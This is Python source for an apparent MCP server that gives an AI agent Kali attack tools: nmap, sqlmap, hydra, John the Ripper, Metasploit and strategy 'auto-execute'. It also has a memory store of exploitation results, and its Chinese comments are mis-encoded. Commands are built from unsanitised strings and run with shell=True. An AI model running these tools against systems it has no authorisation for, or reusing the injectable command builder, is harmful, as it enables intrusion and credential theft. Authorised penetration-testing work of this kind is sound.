        embedding[43] = min(memory_entry["access_count"] / 100.0, 1.0)  # è®¿é—®æ¬¡æ•°æ ‡å‡†åŒ–
        embedding[44] = memory_entry["decay_factor"]

        # ä¸Šä¸‹æ–‡ç‰¹å¾ (45-49)
        if "exploitation_success" in content:
            embedding[45] = 1.0 if content["exploitation_success"] else 0.0

        if "mitigation_present" in content:
            embedding[46] = 1.0 if content["mitigation_present"] else 0.0

        # å‘é‡é•¿åº¦æ ‡å‡†åŒ–
        vector_magnitude = sum(x*x for x in embedding) ** 0.5
        if vector_magnitude > 0:
            embedding = [x / vector_magnitude for x in embedding]

        return embedding

    def _generate_query_embedding(self, query_context: Dict[str, Any]) -> List[float]:
        """ç”ŸæˆæŸ¥è¯¢ä¸Šä¸‹æ–‡çš„å‘é‡åµŒå…¥"""

        # åˆ›å»ºä¸´æ—¶è®°å¿†æ¡ç›®ç”¨äºç”ŸæˆåµŒå…¥
        temp_memory = {
            "content": query_context,
            "type": "query",
            "timestamp": datetime.now().isoformat(),
            "importance_score": 1.0,
            "access_count": 0,
            "decay_factor": 1.0
        }

        return self._generate_embedding(temp_memory)

    def _cosine_similarity(self, vec1: List[float], vec2: List[float]) -> float:
        """è®¡ç®—ä¸¤ä¸ªå‘é‡çš„ä½™å¼¦ç›¸ä¼¼åº¦"""

        if len(vec1) != len(vec2):
            return 0.0

        dot_product = sum(a * b for a, b in zip(vec1, vec2))
        magnitude1 = sum(a * a for a in vec1) ** 0.5
        magnitude2 = sum(b * b for b in vec2) ** 0.5

        if magnitude1 == 0 or magnitude2 == 0:
            return 0.0

        return dot_product / (magnitude1 * magnitude2)

    def _calculate_importance(self, memory_type: str, content: Dict[str, Any]) -> float:
        """è®¡ç®—è®°å¿†é‡è¦æ€§åˆ†æ•°"""

        base_importance = self.memory_weights.get(memory_type, 0.5)

        # åŸºäºå†…å®¹è°ƒæ•´é‡è¦æ€§
        importance_factors = []

        # æˆåŠŸç‡å› å­
        if "success_rate" in content:
            importance_factors.append(content["success_rate"])

        # ä¸¥é‡æ€§å› å­
        if "severity" in content:
            severity_scores = {"low": 0.3, "medium": 0.6, "high": 0.8, "critical": 1.0}
            importance_factors.append(severity_scores.get(content["severity"], 0.5))

        # æ¼æ´åˆ©ç”¨æˆåŠŸå› å­
        if "exploitation_success" in content and content["exploitation_success"]:
            importance_factors.append(1.0)

        # å·¥å…·æ•°é‡å› å­
        if "tools_used" in content:
            tool_factor = min(len(content["tools_used"]) / 10.0, 1.0)
            importance_factors.append(tool_factor)

        # è®¡ç®—æœ€ç»ˆé‡è¦æ€§
        if importance_factors:
            avg_factor = sum(importance_factors) / len(importance_factors)
            final_importance = base_importance * 0.7 + avg_factor * 0.3
        else:
            final_importance = base_importance

        return min(max(final_importance, 0.1), 1.0)

    def _calculate_time_decay(self, timestamp_str: str) -> float:
        """è®¡ç®—æ—¶é—´è¡°å‡å› å­"""

        try:
            timestamp = datetime.fromisoformat(timestamp_str)
            now = datetime.now()
            time_diff = (now - timestamp).total_seconds()

            # 1å°æ—¶å†…ï¼šæ— è¡°å‡ (1.0)
            # 1å¤©å†…ï¼šè½»å¾®è¡°å‡ (0.9)
            # 1å‘¨å†…ï¼šä¸­ç­‰è¡°å‡ (0.7)
            # 1æœˆå†…ï¼šæ˜æ˜¾è¡°å‡ (0.5)
            # æ›´ä¹…ï¼šå¼ºè¡°å‡ (0.3)

            if time_diff < 3600:  # 1å°æ—¶
                return 1.0
            elif time_diff < 86400:  # 1å¤©
                return 0.9
            elif time_diff < 604800:  # 1å‘¨
                return 0.7
            elif time_diff < 2592000:  # 1æœˆ
                return 0.5
            else:
                return 0.3

        except:
            return 0.5

    def _update_knowledge_graph(self, memory_entry: Dict[str, Any],
                              session_context: SessionContext = None):
        """æ›´æ–°çŸ¥è¯†å›¾è°±"""

        content = memory_entry["content"]
        memory_id = memory_entry["id"]

        # æå–å…³é”®å®ä½“
        entities = []

        if "target" in content:
            entities.append(("target", content["target"]))

        if "vulnerability_type" in content:
            entities.append(("vulnerability", content["vulnerability_type"]))

        if "technique" in content:
            entities.append(("technique", content["technique"]))

        if "tools_used" in content:
            for tool in content["tools_used"]:
                entities.append(("tool", tool))

        # æ›´æ–°çŸ¥è¯†å›¾è°±è¿æ¥
        for entity_type, entity_value in entities:
            entity_key = f"{entity_type}:{entity_value}"

            if entity_key not in self.knowledge_graph:
                self.knowledge_graph[entity_key] = {
                    "type": entity_type,
                    "value": entity_value,
                    "connected_memories": [],
                    "connection_strength": {},
                    "last_updated": datetime.now().isoformat()
                }

            # æ·»åŠ è®°å¿†è¿æ¥
            if memory_id not in self.knowledge_graph[entity_key]["connected_memories"]:
                self.knowledge_graph[entity_key]["connected_memories"].append(memory_id)

            # æ›´æ–°è¿æ¥å¼ºåº¦
            for other_entity_type, other_entity_value in entities:
                if entity_type != other_entity_type or entity_value != other_entity_value:
                    other_key = f"{other_entity_type}:{other_entity_value}"

                    if other_key not in self.knowledge_graph[entity_key]["connection_strength"]:
                        self.knowledge_graph[entity_key]["connection_strength"][other_key] = 0

                    self.knowledge_graph[entity_key]["connection_strength"][other_key] += 1

    def _update_memory_clusters(self):
        """æ›´æ–°è®°å¿†èšç±»"""

        logger.info("Updating memory clusters...")

        # ç®€å•çš„K-meansèšç±»å®ç°
        if len(self.vector_storage) < 10:
            return

        # æå–æ‰€æœ‰åµŒå…¥å‘é‡
        embeddings = []
        memory_ids = []

        for memory_id, memory_entry in self.vector_storage.items():
            embeddings.append(memory_entry["embedding"])
            memory_ids.append(memory_id)

        # ç¡®å®šèšç±»æ•°é‡
        num_clusters = min(10, max(3, len(embeddings) // 20))

        # åˆå§‹åŒ–èšç±»ä¸­å¿ƒ
        import random
        cluster_centers = random.sample(embeddings, num_clusters)

        # ç®€å•èšç±»åˆ†é…
        clusters = {i: [] for i in range(num_clusters)}

        for i, embedding in enumerate(embeddings):
            best_cluster = 0
            best_similarity = -1

            for j, center in enumerate(cluster_centers):
                similarity = self._cosine_similarity(embedding, center)
                if similarity > best_similarity:
                    best_similarity = similarity
                    best_cluster = j

            clusters[best_cluster].append(memory_ids[i])

        # æ›´æ–°èšç±»ä¿¡æ¯
        self.memory_clusters = {
            f"cluster_{i}": {
                "center": cluster_centers[i],
                "members": members,
                "size": len(members),
                "last_updated": datetime.now().isoformat()
            }
            for i, members in clusters.items() if members
        }

    def _cleanup_old_memories(self):
        """æ¸…ç†æ—§è®°å¿†ä»¥ä¿æŒåœ¨é™åˆ¶èŒƒå›´å†…"""

        if len(self.vector_storage) <= self.max_memory_entries:
            return

        # è®¡ç®—æ¯ä¸ªè®°å¿†çš„ä¿ç•™åˆ†æ•°
        retention_scores = []

        for memory_id, memory_entry in self.vector_storage.items():
            # åŸºäºé‡è¦æ€§ã€è®¿é—®é¢‘ç‡å’Œæ—¶é—´è¡°å‡è®¡ç®—ä¿ç•™åˆ†æ•°
            importance = memory_entry["importance_score"]
            access_factor = min(1.0 + memory_entry["access_count"] * 0.1, 2.0)
            time_factor = self._calculate_time_decay(memory_entry["timestamp"])

            retention_score = importance * access_factor * time_factor
            retention_scores.append((memory_id, retention_score))

        # æŒ‰ä¿ç•™åˆ†æ•°æ’åº
        retention_scores.sort(key=lambda x: x[1], reverse=True)

        # ä¿ç•™å‰Nä¸ªè®°å¿†
        memories_to_keep = retention_scores[:self.max_memory_entries]
        keep_ids = set(memory_id for memory_id, _ in memories_to_keep)

        # åˆ é™¤ä¸éœ€è¦ä¿ç•™çš„è®°å¿†
        memories_to_delete = [memory_id for memory_id in self.vector_storage.keys()
                            if memory_id not in keep_ids]

        for memory_id in memories_to_delete:
            del self.vector_storage[memory_id]

        logger.info(f"Cleaned up {len(memories_to_delete)} old memories")

    def _generate_contextual_recommendations(self, session_context: SessionContext,
                                          vuln_memories: List[Dict],
                                          exploit_memories: List[Dict]) -> List[Dict[str, Any]]:
        """åŸºäºè®°å¿†ç”Ÿæˆä¸Šä¸‹æ–‡æ¨è"""

        recommendations = []

        # åŸºäºæ¼æ´è®°å¿†çš„æ¨è
        for memory in vuln_memories[:3]:
            vuln_content = memory["memory"]["content"]
            if vuln_content.get("exploitation_success"):
                recommendations.append({
                    "type": "vulnerability_exploitation",
                    "priority": "high",
                    "description": f"ç±»ä¼¼ç›®æ ‡å­˜åœ¨{vuln_content.get('vulnerability_type')}æ¼æ´",
                    "suggested_tools": vuln_content.get("tools_used", []),
                    "confidence": memory["similarity_score"]
                })

        # åŸºäºæˆåŠŸåˆ©ç”¨è®°å¿†çš„æ¨è
        for memory in exploit_memories[:3]:
            exploit_content = memory["memory"]["content"]
            recommendations.append({
                "type": "exploitation_technique",
                "priority": "medium",
                "description": f"å»ºè®®å°è¯•{exploit_content.get('technique')}æŠ€æœ¯",
                "success_rate": exploit_content.get("success_rate", 0),
                "confidence": memory["similarity_score"]
            })

        return recommendations

    def _identify_risk_indicators(self, session_context: SessionContext,
                                relevant_vulns: List[Dict]) -> List[Dict[str, Any]]:
        """è¯†åˆ«é£é™©æŒ‡æ ‡"""

        risk_indicators = []

        # åŸºäºå·²çŸ¥æ¼æ´çš„é£é™©
        high_severity_count = sum(1 for vuln in relevant_vulns
                                if vuln.get("vulnerability", {}).get("severity") in ["high", "critical"])

        if high_severity_count > 0:
            risk_indicators.append({
                "type": "high_severity_vulnerabilities",
                "level": "high",
                "description": f"å‘ç°{high_severity_count}ä¸ªé«˜å±æ¼æ´æ¨¡å¼",
                "recommendation": "ä¼˜å…ˆè¿›è¡Œæ¼æ´éªŒè¯å’Œåˆ©ç”¨"
            })

        # åŸºäºç›®æ ‡å¤æ‚åº¦çš„é£é™©
        complexity = len(session_context.discovered_assets)
        if complexity > 10:
            risk_indicators.append({
                "type": "complex_environment",
                "level": "medium",
                "description": "ç›®æ ‡ç¯å¢ƒå¤æ‚ï¼Œå¯èƒ½å­˜åœ¨æœªçŸ¥é£é™©",
                "recommendation": "é‡‡ç”¨åˆ†é˜¶æ®µæ·±å…¥åˆ†æç­–ç•¥"
            })

        return risk_indicators

    def export_memory_analytics(self) -> Dict[str, Any]:
        """å¯¼å‡ºè®°å¿†åˆ†ææŠ¥å‘Š"""

        analytics = {
            "memory_statistics": {
                "total_memories": len(self.vector_storage),
                "memory_types": {},
                "cluster_count": len(self.memory_clusters),
                "knowledge_graph_entities": len(self.knowledge_graph)
            },
            "memory_distribution": {},
            "access_patterns": {},
            "retention_analysis": {},
            "knowledge_insights": []
        }

        # è®°å¿†ç±»å‹åˆ†å¸ƒ
        for memory_entry in self.vector_storage.values():
            memory_type = memory_entry["type"]
            if memory_type not in analytics["memory_statistics"]["memory_types"]:
                analytics["memory_statistics"]["memory_types"][memory_type] = 0
            analytics["memory_statistics"]["memory_types"][memory_type] += 1

        # è®¿é—®æ¨¡å¼åˆ†æ
        access_counts = [m["access_count"] for m in self.vector_storage.values()]
        if access_counts:
            analytics["access_patterns"] = {
                "average_access": sum(access_counts) / len(access_counts),
                "max_access": max(access_counts),
                "frequently_accessed": len([c for c in access_counts if c > 5])
            }

        # çŸ¥è¯†æ´å¯Ÿ
        if self.knowledge_graph:
            # æ‰¾åˆ°æœ€è¿æ¥çš„å®ä½“
            most_connected = max(self.knowledge_graph.items(),
                               key=lambda x: len(x[1]["connected_memories"]))

            analytics["knowledge_insights"].append({
                "type": "most_connected_entity",
                "entity": most_connected[0],
                "connections": len(most_connected[1]["connected_memories"])
            })

        return analytics

# å…¨å±€é«˜çº§å†…å­˜æŒä¹…åŒ–å®ä¾‹
advanced_memory = AdvancedMemoryPersistence()


# å…¨å±€AIä¸Šä¸‹æ–‡ç®¡ç†å™¨å®ä¾‹
ai_context_manager = AIContextManager()

# Default configuration
DEFAULT_KALI_SERVER = "http://192.168.2.66:5000"  # å›ºå®šçš„Kaliæ”»å‡»æœºIPåœ°å€
DEFAULT_REQUEST_TIMEOUT = 10  # 10 seconds ultra fast timeout for API requests

# ==================== Local Command Executor ====================

import subprocess
from pathlib import Path

class LocalCommandExecutor:
    """æœ¬åœ°å‘½ä»¤æ‰§è¡Œå™¨ - ç›´æ¥ä½¿ç”¨subprocessæ‰§è¡ŒKaliå·¥å…·"""

    def __init__(self, timeout: int = 300, working_dir: str = None):
        """
        åˆå§‹åŒ–æœ¬åœ°å‘½ä»¤æ‰§è¡Œå™¨

        Args:
            timeout: å‘½ä»¤æ‰§è¡Œè¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
            working_dir: å·¥ä½œç›®å½•
        """
        self.timeout = timeout
        self.working_dir = working_dir or os.getcwd()
        logger.info(f"åˆå§‹åŒ–æœ¬åœ°å‘½ä»¤æ‰§è¡Œå™¨ï¼Œå·¥ä½œç›®å½•: {self.working_dir}")

    def execute_command(self, command: str, timeout: int = None) -> Dict[str, Any]:
        """
        æ‰§è¡Œshellå‘½ä»¤

        Args:
            command: è¦æ‰§è¡Œçš„å‘½ä»¤
            timeout: å‘½ä»¤è¶…æ—¶æ—¶é—´ï¼ˆå¯é€‰ï¼Œè¦†ç›–é»˜è®¤å€¼ï¼‰

        Returns:
            æ‰§è¡Œç»“æœå­—å…¸
        """
        cmd_timeout = timeout or self.timeout

        try:
            logger.debug(f"æ‰§è¡Œå‘½ä»¤: {command}")

            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=cmd_timeout,
                cwd=self.working_dir
            )

            success = result.returncode == 0

            return {
                "success": success,
                "output": result.stdout,
                "error": result.stderr if not success else "",
                "return_code": result.returncode,
                "command": command
            }

        except subprocess.TimeoutExpired:
            logger.warning(f"å‘½ä»¤æ‰§è¡Œè¶…æ—¶ ({cmd_timeout}ç§’): {command}")
            return {
                "success": False,
                "error": f"Command timeout after {cmd_timeout} seconds",
                "output": "",
                "return_code": -1,
                "command": command
            }
        except Exception as e:
            logger.error(f"å‘½ä»¤æ‰§è¡Œå¤±è´¥: {command}, é”™è¯¯: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "output": "",
                "return_code": -1,
                "command": command
            }

    def check_tool_available(self, tool_name: str) -> bool:
        """æ£€æŸ¥å·¥å…·æ˜¯å¦å¯ç”¨"""
        result = self.execute_command(f"which {tool_name}", timeout=5)
        return result["success"]

    def get_tool_version(self, tool_name: str) -> str:
        """è·å–å·¥å…·ç‰ˆæœ¬"""
        result = self.execute_command(f"{tool_name} --version 2>&1 | head -1", timeout=5)
        return result["output"].strip() if result["success"] else "Unknown"

    def execute_tool_with_data(self, tool_name: str, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        æ ¹æ®å·¥å…·åç§°å’Œæ•°æ®å­—å…¸æ‰§è¡Œå·¥å…·å‘½ä»¤

        Args:
            tool_name: å·¥å…·åç§°
            data: å·¥å…·å‚æ•°å­—å…¸

        Returns:
            æ‰§è¡Œç»“æœ
        """
        command = self._build_tool_command(tool_name, data)
        if not command:
            return {"success": False, "error": f"Unsupported tool: {tool_name}"}

        return self.execute_command(command)

    def _build_tool_command(self, tool_name: str, data: Dict[str, Any]) -> str:
        """æ„å»ºå·¥å…·å‘½ä»¤"""
        if tool_name == "nmap":
            target = data.get("target", "")
            scan_type = data.get("scan_type", "-sV")
            ports = data.get("ports", "")
            additional_args = data.get("additional_args", "")
            cmd = f"nmap {scan_type} {target}"
            if ports:
                cmd += f" -p {ports}"
            if additional_args:
                cmd += f" {additional_args}"
            return cmd

        elif tool_name == "gobuster":
            url = data.get("url", "")
            mode = data.get("mode", "dir")
            wordlist = data.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            additional_args = data.get("additional_args", "")
            return f"gobuster {mode} -u {url} -w {wordlist} {additional_args}"

        elif tool_name == "sqlmap":
            url = data.get("url", "")
            data_param = data.get("data", "")
            additional_args = data.get("additional_args", "")
            cmd = f"sqlmap -u {url}"
            if data_param:
                cmd += f" --data='{data_param}'"
            if additional_args:
                cmd += f" {additional_args}"
            return cmd

        elif tool_name == "nikto":
            target = data.get("target", "")
            additional_args = data.get("additional_args", "")
            return f"nikto -h {target} {additional_args}"

        elif tool_name == "hydra":
            target = data.get("target", "")
            service = data.get("service", "")
            username_list = data.get("username_list", "")
            password_list = data.get("password_list", "")
            additional_args = data.get("additional_args", "")
            return f"hydra -L {username_list} -P {password_list} {target} {service} {additional_args}"

        elif tool_name == "dirb":
            url = data.get("url", "")
            wordlist = data.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
            return f"dirb {url} {wordlist}"

        # å¯¹äºå…¶ä»–å·¥å…·ï¼Œè¿”å›é€šç”¨å‘½ä»¤
        return f"{tool_name} {' '.join(str(v) for v in data.values() if v)}"

# ==================== WebSocket Kali Client (å°†è¢«åˆ é™¤) ====================

def setup_mcp_server() -> FastMCP:
    """
    Set up the MCP server with all tool functions

    Returns:
        Configured FastMCP instance
    """
    # åˆ›å»ºå…¨å±€æœ¬åœ°å‘½ä»¤æ‰§è¡Œå™¨
    global executor
    executor = LocalCommandExecutor(timeout=300)
    logger.info("æœ¬åœ°å‘½ä»¤æ‰§è¡Œå™¨å·²åˆå§‹åŒ–")

    mcp = FastMCP("kali-mcp")

    # ==================== æ€§èƒ½ä¼˜åŒ–å·¥å…· ====================

    @mcp.tool()
    async def optimization_stats() -> Dict[str, Any]:
        """
        è·å–æ€§èƒ½ä¼˜åŒ–ç»Ÿè®¡ä¿¡æ¯

        Returns:
            ä¼˜åŒ–ç»Ÿè®¡æ•°æ®ï¼ŒåŒ…æ‹¬è¿æ¥æ± å’Œç¼“å­˜å‘½ä¸­ç‡
        """
        if not OPTIMIZATION_ENABLED:
            return {
                "optimization_enabled": False,
                "message": "ä¼˜åŒ–æ¨¡å—æœªå¯ç”¨"
            }

        try:
            # è·å–è¿æ¥æ± ç»Ÿè®¡
            pool_manager = get_connection_pool()
            pool_stats = pool_manager.get_stats()

            # è·å–ç¼“å­˜ç»Ÿè®¡
            cache = get_result_cache()
            cache_stats = cache.get_stats()

            return {
                "optimization_enabled": True,
                "connection_pool": pool_stats,
                "result_cache": cache_stats,
                "performance_boost": {
                    "connection_reuse_rate": pool_stats.get('reuse_rate', '0%'),
                    "cache_hit_rate": cache_stats.get('hit_rate', '0%'),
                    "estimated_speedup": "30-50%"
                }
            }

        except Exception as e:
            return {
                "optimization_enabled": True,
                "error": f"è·å–ç»Ÿè®¡ä¿¡æ¯å¤±è´¥: {str(e)}"
            }

    @mcp.tool()
    async def clear_cache() -> Dict[str, Any]:
        """
        æ¸…ç©ºç»“æœç¼“å­˜

        Returns:
            æ¸…ç©ºç»“æœ
        """
        if not OPTIMIZATION_ENABLED:
            return {"success": False, "message": "ä¼˜åŒ–æ¨¡å—æœªå¯ç”¨"}

        try:
            cache = get_result_cache()
            cleared_count = cache.clear_all()

            return {
                "success": True,
                "cleared_files": cleared_count,
                "message": f"å·²æ¸…ç©º {cleared_count} ä¸ªç¼“å­˜æ–‡ä»¶"
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"æ¸…ç©ºç¼“å­˜å¤±è´¥: {str(e)}"
            }

    # ==================== ä¼ ç»Ÿå·¥å…· (å¢å¼ºç‰ˆ) ====================

    @mcp.tool()
    def nmap_scan(target: str, scan_type: str = "-sV", ports: str = "", additional_args: str = "",
                  intelligent_optimization: bool = True, target_type: str = "unknown",
                  time_constraint: str = "quick", stealth_mode: bool = False) -> Dict[str, Any]:
        """
        Execute an Nmap scan against a target with intelligent parameter optimization.

        Args:
            target: The IP address or hostname to scan
            scan_type: Scan type (e.g., -sV for version detection)
            ports: Comma-separated list of ports or port ranges
            additional_args: Additional Nmap arguments
            intelligent_optimization: Enable intelligent parameter optimization
            target_type: Target type (web, network, database, windows, linux)
            time_constraint: Time constraint (quick, standard, thorough)
            stealth_mode: Enable stealth mode

        Returns:
            Scan results with intelligent analysis
        """
        data = {
            "target": target,
            "scan_type": scan_type,
            "ports": ports,
            "additional_args": additional_args,
            "intelligent_optimization": intelligent_optimization,
            "target_type": target_type,
            "time_constraint": time_constraint,
            "stealth_mode": stealth_mode
        }
        return executor.execute_tool_with_data("nmap", data)

    @mcp.tool()
    def gobuster_scan(url: str, mode: str = "dir", wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                     additional_args: str = "", intelligent_optimization: bool = True,
                     target_type: str = "web", time_constraint: str = "quick", stealth_mode: bool = False) -> Dict[str, Any]:
        """
        Execute Gobuster to find directories, DNS subdomains, or virtual hosts with intelligent optimization.

        Args:
            url: The target URL
            mode: Scan mode (dir, dns, fuzz, vhost)
            wordlist: Path to wordlist file
            additional_args: Additional Gobuster arguments
            intelligent_optimization: Enable intelligent parameter optimization
            target_type: Target type (web, cms, api, etc.)
            time_constraint: Time constraint (quick, standard, thorough)
            stealth_mode: Enable stealth mode

        Returns:
            Scan results with intelligent analysis
        """
        data = {
            "url": url,
            "mode": mode,
            "wordlist": wordlist,
            "additional_args": additional_args,
            "intelligent_optimization": intelligent_optimization,
            "target_type": target_type,
            "time_constraint": time_constraint,
            "stealth_mode": stealth_mode
        }
        return executor.execute_tool_with_data("gobuster", data)

    @mcp.tool()
    def dirb_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Dirb web content scanner.
        
        Args:
            url: The target URL
            wordlist: Path to wordlist file
            additional_args: Additional Dirb arguments
            
        Returns:
            Scan results
        """
        data = {
            "url": url,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dirb", data)

    @mcp.tool()
    def nikto_scan(target: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Nikto web server scanner.
        
        Args:
            target: The target URL or IP
            additional_args: Additional Nikto arguments
            
        Returns:
            Scan results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("nikto", data)

    @mcp.tool()
    def sqlmap_scan(url: str, data: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute SQLmap SQL injection scanner.
        
        Args:
            url: The target URL
            data: POST data string
            additional_args: Additional SQLmap arguments
            
        Returns:
            Scan results
        """
        post_data = {
            "url": url,
            "data": data,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("sqlmap", post_data)

    @mcp.tool()
    def metasploit_run(module: str, options: Dict[str, Any] = {}) -> Dict[str, Any]:
        """
        Execute a Metasploit module.
        
        Args:
            module: The Metasploit module path
            options: Dictionary of module options
            
        Returns:
            Module execution results
        """
        data = {
            "module": module,
            "options": options
        }
        return executor.execute_tool_with_data("metasploit", data)

    @mcp.tool()
    def hydra_attack(
        target: str, 
        service: str, 
        username: str = "", 
        username_file: str = "", 
        password: str = "", 
        password_file: str = "", 
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Execute Hydra password cracking tool.
        
        Args:
            target: Target IP or hostname
            service: Service to attack (ssh, ftp, http-post-form, etc.)
            username: Single username to try
            username_file: Path to username file
            password: Single password to try
            password_file: Path to password file
            additional_args: Additional Hydra arguments
            
        Returns:
            Attack results
        """
        data = {
            "target": target,
            "service": service,
            "username": username,
            "username_file": username_file,
            "password": password,
            "password_file": password_file,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("hydra", data)

    @mcp.tool()
    def john_crack(
        hash_file: str, 
        wordlist: str = "/usr/share/wordlists/rockyou.txt", 
        format_type: str = "", 
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Execute John the Ripper password cracker.
        
        Args:
            hash_file: Path to file containing hashes
            wordlist: Path to wordlist file
            format_type: Hash format type
            additional_args: Additional John arguments
            
        Returns:
            Cracking results
        """
        data = {
            "hash_file": hash_file,
            "wordlist": wordlist,
            "format": format_type,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("john", data)

    @mcp.tool()
    def wpscan_analyze(url: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute WPScan WordPress vulnerability scanner.
        
        Args:
            url: The target WordPress URL
            additional_args: Additional WPScan arguments
            
        Returns:
            Scan results
        """
        data = {
            "url": url,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wpscan", data)

    @mcp.tool()
    def enum4linux_scan(target: str, additional_args: str = "-a") -> Dict[str, Any]:
        """
        Execute Enum4linux Windows/Samba enumeration tool.
        
        Args:
            target: The target IP or hostname
            additional_args: Additional enum4linux arguments
            
        Returns:
            Enumeration results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("enum4linux", data)

    @mcp.tool()
    def server_health() -> Dict[str, Any]:
        """
        Check the health status of the Kali API server.

        Returns:
            Server health information
        """
        return {"success": True, "status": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼", "message": "æ— éœ€å¥åº·æ£€æŸ¥"}

    # ==================== AIä¸Šä¸‹æ–‡æ„ŸçŸ¥å·¥å…· ====================

    @mcp.tool()
    def ai_create_session(target: str = "", attack_mode: str = "pentest", session_name: str = "") -> Dict[str, Any]:
        """
        åˆ›å»ºæ–°çš„AIä¸Šä¸‹æ–‡æ„ŸçŸ¥ä¼šè¯ - å¯ç”¨æŒç»­å¯¹è¯çŠ¶æ€ç®¡ç†

        Args:
            target: ç›®æ ‡IPåœ°å€ã€åŸŸåæˆ–URL
            attack_mode: æ”»å‡»æ¨¡å¼ (pentest, ctf, analysis)
            session_name: è‡ªå®šä¹‰ä¼šè¯åç§°ï¼ˆå¯é€‰ï¼‰

        Returns:
            æ–°åˆ›å»ºçš„ä¼šè¯ä¿¡æ¯å’Œåˆå§‹å»ºè®®
        """
        try:
            session = ai_context_manager.create_session(target, attack_mode)
            if session_name:
                session.context_metadata["custom_name"] = session_name

            # ç«‹å³åˆ†æç›®æ ‡å¹¶ç”Ÿæˆåˆå§‹ç­–ç•¥å»ºè®®
            if target:
                initial_analysis = ai_context_manager.strategy_engine.analyze_context(session, f"åˆ†æç›®æ ‡ {target}")
                session.context_metadata["initial_analysis"] = initial_analysis

            return {
                "success": True,
                "session_id": session.session_id,
                "session_summary": session.get_context_summary(),
                "initial_strategy_recommendations": session.context_metadata.get("initial_analysis", {}),
                "next_steps": ai_context_manager.get_session_insights(session.session_id),
                "message": f"AIä¼šè¯å·²åˆ›å»ºï¼Œä¼šè¯ID: {session.session_id}"
            }
        except Exception as e:
            logger.error(f"AI session creation error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_analyze_intent(user_message: str, session_id: str = "") -> Dict[str, Any]:
        """
        AIæ„å›¾åˆ†æ - åˆ†æç”¨æˆ·è¾“å…¥å¹¶æä¾›æ™ºèƒ½å»ºè®®

        Args:
            user_message: ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯
            session_id: ä¼šè¯IDï¼ˆå¯é€‰ï¼‰

        Returns:
            æ„å›¾åˆ†æç»“æœå’Œæ™ºèƒ½å»ºè®®
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            # åˆ†æç”¨æˆ·æ„å›¾
            intent = ai_context_manager.analyze_user_intent(user_message)

            # ç”Ÿæˆä¸Šä¸‹æ–‡æ„ŸçŸ¥çš„å“åº”
            contextual_response = ai_context_manager.generate_contextual_response(session, user_message)

            # æ›´æ–°ç›®æ ‡ï¼ˆå¦‚æœä»æ¶ˆæ¯ä¸­æå–åˆ°äº†æ–°ç›®æ ‡ï¼‰
            if intent.get("target_extraction") and not session.target:
                session.target = intent["target_extraction"]
                session.context_metadata["target_auto_extracted"] = True

            return {
                "success": True,
                "session_id": session.session_id,
                "intent_analysis": intent,
                "contextual_response": contextual_response,
                "session_updated": bool(intent.get("target_extraction")),
                "recommended_tools": contextual_response.get("strategy_recommendations", [])
            }
        except Exception as e:
            logger.error(f"AI intent analysis error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_get_strategy_recommendations(session_id: str = "", user_context: str = "") -> Dict[str, Any]:
        """
        è·å–AIç­–ç•¥å»ºè®® - åŸºäºå½“å‰ä¼šè¯ä¸Šä¸‹æ–‡æ¨èæœ€ä½³æ”»å‡»ç­–ç•¥

        Args:
            session_id: ä¼šè¯IDï¼ˆå¯é€‰ï¼‰
            user_context: é¢å¤–çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ä¿¡æ¯

        Returns:
            è¯¦ç»†çš„ç­–ç•¥å»ºè®®å’Œæ‰§è¡Œè®¡åˆ’
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            # è·å–ç­–ç•¥å»ºè®®
            strategy_analysis = ai_context_manager.strategy_engine.analyze_context(session, user_context)

            # è·å–ä¼šè¯æ´å¯Ÿ
            insights = ai_context_manager.get_session_insights(session.session_id)

            return {
                "success": True,
                "session_id": session.session_id,
                "strategy_analysis": strategy_analysis,
                "session_insights": insights,
                "execution_plan": {
                    "recommended_strategies": strategy_analysis.get("recommended_strategies", []),
                    "next_actions": insights.get("next_recommendations", []),
                    "estimated_completion_time": "æ ¹æ®ç­–ç•¥å¤æ‚åº¦è€Œå®š"
                },
                "context_summary": session.get_context_summary()
            }
        except Exception as e:
            logger.error(f"AI strategy recommendations error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_execute_strategy(strategy_name: str, session_id: str = "", auto_execute: bool = False) -> Dict[str, Any]:
        """
        AIç­–ç•¥æ‰§è¡Œ - è‡ªåŠ¨æ‰§è¡Œæ¨èçš„æ”»å‡»ç­–ç•¥

        Args:
            strategy_name: ç­–ç•¥åç§° (web_comprehensive, ctf_quick_solve, network_recon, pwn_exploitation, adaptive_multi)
            session_id: ä¼šè¯IDï¼ˆå¯é€‰ï¼‰
            auto_execute: æ˜¯å¦è‡ªåŠ¨æ‰§è¡Œæ‰€æœ‰ç›¸å…³å·¥å…·

        Returns:
            ç­–ç•¥æ‰§è¡Œç»“æœå’Œè¿›å±•çŠ¶æ€
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)
